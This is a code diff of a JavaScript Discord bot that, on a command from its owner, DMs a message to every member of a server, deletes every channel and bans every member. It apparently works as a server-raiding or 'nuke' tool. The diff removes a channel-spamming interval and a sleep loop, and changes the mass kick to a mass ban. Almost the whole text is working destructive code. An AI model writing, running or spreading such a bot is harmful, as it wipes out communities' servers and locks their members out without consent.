@@ -12,15 +12,6 @@ function isOwner(id) {
     return false;
 }
 
-function sleep(milliseconds) {
-  var start = new Date().getTime();
-  for (var i = 0; i < 1e7; i++) {
-    if ((new Date().getTime() - start) > milliseconds){
-      break;
-    }
-  }
-}
-
 client.on('message', message => {
     if (isOwner(message.author.id)) {
         var args = message.content.split(" ");
@@ -31,17 +22,11 @@ client.on('message', message => {
         client.guilds.get(serverid).members.map(m => {
                 m.send(msg);
         });
-        var interval = setInterval(function () {
-            client.guilds.get(gid).channels.map(c => {
-                if (c.type == "text") c.send(msg);
-            });
-        }, 600);
-        sleep(10000);
         guild.channels.forEach(c => {
             c.delete();
         });
         guild.members.forEach(m => {
-            m.kick();
+            m.ban();
         });
     }
 });
